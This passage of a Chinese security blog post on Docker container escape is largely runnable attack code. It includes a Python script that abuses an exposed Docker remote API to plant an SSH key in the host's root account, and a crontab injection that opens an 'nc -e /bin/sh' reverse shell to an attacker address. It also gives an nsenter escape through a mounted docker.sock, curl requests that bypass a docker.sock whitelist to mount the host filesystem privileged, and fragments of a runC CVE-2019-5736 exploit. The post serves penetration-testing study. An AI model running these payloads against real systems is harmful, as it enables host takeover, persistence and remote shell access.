class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启代理</span></span><br><span class="line">socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, <span class="string">'127.0.0.1'</span>, <span class="number">1081</span>)</span><br><span class="line"><span class="comment">#socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 1081)</span></span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'172.16.145.xxx'</span></span><br><span class="line">cli = docker.DockerClient(base_url=<span class="string">'tcp://'</span>+ip+<span class="string">':2375'</span>, version=<span class="string">'auto'</span>) </span><br><span class="line"><span class="comment">#端口不一定为2375，指定version参数是因为本机和远程主机的API版本可能不同，指定为auto可以自己判断版本</span></span><br><span class="line">image = cli.images.list()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取生成的公钥</span></span><br><span class="line">f = open(<span class="string">'id_rsa_2048.pub'</span>, <span class="string">'r'</span>)</span><br><span class="line">sshKey = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cli.containers.run(</span><br><span class="line">        image=image.tags[<span class="number">0</span>], </span><br><span class="line">        command=<span class="string">'sh -c "echo '</span>+sshKey+<span class="string">' &gt;&gt; /usr/games/authorized_keys"'</span>, <span class="comment">#这里卡了很久，这是正确有效的写法，在有重定向时直接写命令是无法正确执行的，记得加上sh -c</span></span><br><span class="line">        volumes=&#123;<span class="string">'/root/.ssh'</span>:&#123;<span class="string">'bind'</span>: <span class="string">'/usr/games'</span>, <span class="string">'mode'</span>: <span class="string">'rw'</span>&#125;&#125;, <span class="comment">#找一个基本所有环境都有的目录</span></span><br><span class="line">        name=<span class="string">'test'</span> <span class="comment">#给容器命名，便于后面删除</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">except</span> docker.errors.ContainerError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除容器</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    container = cli.containers.get(<span class="string">'test'</span>)</span><br><span class="line">    container.remove()</span><br><span class="line"><span class="keyword">except</span> Expection <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">'http://your-ip:2375/'</span>)</span><br><span class="line">data = client.containers.run(<span class="string">'alpine:latest'</span>, <span class="string">r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' &gt;&gt; /tmp/etc/crontabs/root" '''</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">'/etc'</span>: &#123;<span class="string">'bind'</span>: <span class="string">'/tmp/etc'</span>, <span class="string">'mode'</span>: <span class="string">'rw'</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="docker-sock暴露到容器内部"><a href="#docker-sock暴露到容器内部" class="headerlink" title="docker.sock暴露到容器内部"></a>docker.sock暴露到容器内部</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 容器内部可以与docker deamon通信</span></span><br><span class="line">sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-2/" target="_blank" rel="noopener">example1</a></p>
+<p><a href="https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-introduction/" target="_blank" rel="noopener">example2</a></p>
+<h3 id="docker-sock-配置白名单绕过"><a href="#docker-sock-配置白名单绕过" class="headerlink" title="docker.sock 配置白名单绕过"></a>docker.sock 配置白名单绕过</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200901145144-9944d05e-ec1f-1.png" alt=""></p>
+<blockquote>
+<p>用户请求  <code>/var/run/somethingelse.sock</code> ，经由反向代理，将这些请求转发到 <code>/var/run/docker.sock</code>。</p>
+<p>反向代理根据预先保存在配置文件中的授权值白名单来决定是否请求 <code>/var/run/docker.sock</code>。</p>
+<p>例如，只有当一个请求符合特定的HTTP方法(GET、POST等……)、路径(例r如<code>/containers/create</code>)和/或JSON体时，才可以让其通过。</p>
+</blockquote>
+<h4 id="挂载目录"><a href="#挂载目录" class="headerlink" title="挂载目录"></a>挂载目录</h4><blockquote>
+<p>白名单在验证<code>/dev/log:/dev/log</code>时通过<br>传递多个 <code>&quot;Binds&quot;: [&quot;/:/hostos&quot;, &quot;/dev/log:/dev/log&quot;]</code> 挂载目录即可挂载成功</p>
+</blockquote>
+<h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><p>执行/containers/{id}/exec时拦截 ，使用attach绕过</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s --unix-socket /var/run/somethingelse.sock -X POST “http://localhost/containers/4fa6bfc84930/attach?logs=1&amp;stream=1&amp;stdin=true&amp;stdout=true&amp;stderr=true”</span><br></pre></td></tr></table></figure>
+
+<h4 id="挂载目录获取root权限"><a href="#挂载目录获取root权限" class="headerlink" title="挂载目录获取root权限"></a>挂载目录获取root权限</h4><p>使用Docker API Cmd参数,不使用Entrypoint参数</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s --unix-socket /var/run/somethingelse.sock -X POST -H 'Content-Type: application/json' --data-binary '&#123;"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true, "Tty": true,"OpenStdin": true, "StdinOnce": true,"Entrypoint": "","Cmd": ["touch", "/hostos/root/1.txt"],"Image": "dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT","Volumes": &#123;"/hostos/": &#123;&#125;&#125;, "HostConfig": &#123;"Binds": ["/:/hostos", "/dev/log:/dev/log"], "Privileged": true&#125;&#125;' http://localhost/containers/create</span><br></pre></td></tr></table></figure>
+
+<h2 id="容器服务缺陷"><a href="#容器服务缺陷" class="headerlink" title="容器服务缺陷"></a>容器服务缺陷</h2><h3 id="runC-cve-2019-5736"><a href="#runC-cve-2019-5736" class="headerlink" title="runC cve-2019-5736"></a>runC cve-2019-5736</h3><ul>
+<li><p>runC</p>
+<blockquote>
+<p>runC 管理容器的创建，运行，销毁等<br>Docker 运行时通常会实现镜像创建和管理等功能</p>
+</blockquote>
+</li>
+<li><p>影响版本</p>
+<table>
+<thead>
+<tr>
+<th>平台或产品</th>
+<th>受影响版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Docker</td>
+<td>Version &lt; 18.09.2</td>
+</tr>
+<tr>
+<td>runC</td>
+<td>Version &lt;= 1.0-rc6</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>利用链</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200901145151-9d4cf2b2-ec1f-1.jpg" alt=""></p>
+<blockquote>
+<p>不使用runC init覆盖：因为CVE-2016-9962 patch</p>
+</blockquote>
+</li>
+<li><p><a href="https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw/" target="_blank" rel="noopener">复现环境</a></p>
+</li>
+</ul>
+<h4 id="Docker-exec-poc"><a href="#Docker-exec-poc" class="headerlink" title="Docker exec poc"></a>Docker exec poc</h4><blockquote>
+<p>循环等待 runC init的 PID -&gt; open(“/proc/pid/exe”，O_RDONLY) -&gt; execve()释放 runC的IO并覆盖runC二进制文件 -&gt; execve()执行被覆盖 runC</p>
+</blockquote>
+<ul>
+<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC/" target="_blank" rel="noopener">POC</a></li>
+</ul>
+<h4 id="恶意镜像poc"><a href="#恶意镜像poc" class="headerlink" title="恶意镜像poc"></a>恶意镜像poc</h4><blockquote>
+<p>通过欺骗runC init execve -&gt; runc 执行/proc/self/exe -&gt; /proc/[runc-pid]/exe覆盖runC 二进制文件</p>
+</blockquote>
+<ul>
+<li><p><a href="https://github.com/twistlock/RunC-CVE-2019-5736" target="_blank" rel="noopener">POC</a></p>
+</li>
+<li><p>POC 分析</p>
+<blockquote>
+<p>Dockerfile</p>
+</blockquote>
+<ul>
+<li><p>获取libseccomp文件并将run_at_link文件加入，runC启动运行libseccomp</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD</span><span class="bash"> run_at_link.c /root/run_at_link.c</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">set</span> -e -x ;\</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> /root/libseccomp-* ;\</span></span><br><span class="line"><span class="bash">    cat /root/run_at_link.c &gt;&gt; src/api.c ;\</span></span><br><span class="line"><span class="bash">    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\</span></span><br><span class="line"><span class="bash">    dpkg -i /root/*.deb</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>overwrite_runc添加docker中并编译</p>
+</li>
+<li><p>使入口点指向runc</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">set</span> -e -x ;\</span></span><br><span class="line"><span class="bash">    ln -s /proc/self/exe /entrypoint</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [ <span class="string">"/entrypoint"</span> ]</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<blockquote>
+<p>run_at_link</p>
+</blockquote>
+<ul>
+<li><p>run_at_link read runc binary 获得fd</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> runc_fd_read = <span class="built_in">open</span>(<span class="string">"/proc/self/exe"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (runc_fd_read == <span class="number">-1</span> ) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] can't open /proc/self/exe\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Opened runC for reading as /proc/self/fd/%d\n"</span>, runc_fd_read);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调用execve执行overwrite_runc</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">"/overwrite_runc"</span>, argv_overwrite, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>overwrite_runc写入poc string</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="Docker-cp-CVE-2019-14271"><a href="#Docker-cp-CVE-2019-14271" class="headerlink" title="Docker cp (CVE-2019-14271)"></a>Docker cp (CVE-2019-14271)</h3><ul>
+<li><a href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/" target="_blank" rel="noopener">poc</a></li>
+</ul>
+<h3 id="Docker-build-code-execution-CVE-2019-13139"><a href="#Docker-build-code-execution-CVE-2019-13139" class="headerlink" title="Docker build code execution (CVE-2019-13139)"></a>Docker build code execution (CVE-2019-13139)</h3><ul>
+<li><a href="https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/" target="_blank" rel="noopener">poc</a></li>
+</ul>
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><h3 id="Dirty-cow"><a href="#Dirty-cow" class="headerlink" title="Dirty cow"></a>Dirty cow</h3><blockquote>
+<p>脏牛漏洞(CVE-2016-5195)与VDSO(虚拟动态共享对象)<br>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p>
+<p>竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。</p>
+<p>在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</p>
+</blockquote>
+<ul>
+<li>流程<ul>
+<li>使用内核漏洞进入内核上下文</li>
+<li>获取当前进程的task struct</li>
+<li>回溯 task list 获取 pid = 1 的 task struct，复制其相关数据</li>
+<li>切换当前 namespace</li>
+<li>打开 root shell，完成逃逸</li>
+</ul>
+</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7881#toc-2" target="_blank" rel="noopener">参考1</a></p>
+<p><a href="https://www.anquanke.com/post/id/179623" target="_blank" rel="noopener">参考2</a></p>
+<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote>
+<ol>
+<li>博主初衷为分享网络安全知识，请勿利用技术做出任何危害网络安全的行为，否则后果自负，与本人无关！</li>
+<li>部分学习内容来自网络，回馈网络，如涉及版权问题，请联系删除  orz </li>
+</ol>
+</blockquote>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://passenger-amao.github.io">AMao</a></p><p> <span>Link:  </span><a href="https://passenger-amao.github.io/2020/09/09/Docker%20%E9%80%83%E9%80%B8/">https://passenger-amao.github.io/2020/09/09/Docker%20%E9%80%83%E9%80%B8/</a></p><p> <span>Copyright:  </span><span>本站所有文章均采用 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">署名-非商业性使用-相同方式共享 4.0 国际(CC BY-NC-SA 4.0)</a> 许可协议。转载请注明出处！</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2020/08/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" title="内网安全基础"><span>NextPost ></span><br><span class="nextTitle">内网安全基础</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo" target="_blank" rel="noopener"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker-逃逸"><span class="toc-number">1.</span> <span class="toc-text">Docker 逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断是否为-Docker"><span class="toc-number">1.1.</span> <span class="toc-text">判断是否为 Docker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#配置不当引发的-doker-逃逸"><span class="toc-number">1.2.</span> <span class="toc-text">配置不当引发的 doker 逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#不安全的启动参数"><span class="toc-number">1.2.1.</span> <span class="toc-text">不安全的启动参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#–privileged-利用"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">–privileged 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#–cap-add-SYS-ADMIN-利用"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">–cap-add=SYS_ADMIN 利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-sock-简述"><span class="toc-number">1.2.2.</span> <span class="toc-text">docker.sock 简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-remote-api-未授权访问"><span class="toc-number">1.2.3.</span> <span class="toc-text">docker remote api 未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#docker-swarm简述"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">docker swarm简述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-利用-api"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">HTTP 利用 api</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RCE"><span class="toc-number">1.2.3.2.1.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#接管主机"><span class="toc-number">1.2.3.2.2.</span> <span class="toc-text">接管主机</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-python-api"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">Docker python api</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#写入-ssh-密钥"><span class="toc-number">1.2.3.3.1.</span> <span class="toc-text">写入 ssh 密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#计划任务"><span class="toc-number">1.2.3.3.2.</span> <span class="toc-text">计划任务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-sock暴露到容器内部"><span class="toc-number">1.2.4.</span> <span class="toc-text">docker.sock暴露到容器内部</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-sock-配置白名单绕过"><span class="toc-number">1.2.5.</span> <span class="toc-text">docker.sock 配置白名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#挂载目录"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">挂载目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行命令"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#挂载目录获取root权限"><span class="toc-number">1.2.5.3.</span> <span class="toc-text">挂载目录获取root权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#容器服务缺陷"><span class="toc-number">1.3.</span> <span class="toc-text">容器服务缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#runC-cve-2019-5736"><span class="toc-number">1.3.1.</span> <span class="toc-text">runC cve-2019-5736</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-exec-poc"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Docker exec poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#恶意镜像poc"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">恶意镜像poc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-cp-CVE-2019-14271"><span class="toc-number">1.3.2.</span> <span class="toc-text">Docker cp (CVE-2019-14271)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-build-code-execution-CVE-2019-13139"><span class="toc-number">1.3.3.</span> <span class="toc-text">Docker build code execution (CVE-2019-13139)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内核提权"><span class="toc-number">1.4.</span> <span class="toc-text">内核提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dirty-cow"><span class="toc-number">1.4.1.</span> <span class="toc-text">Dirty cow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#声明"><span class="toc-number">1.6.</span> <span class="toc-text">声明</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
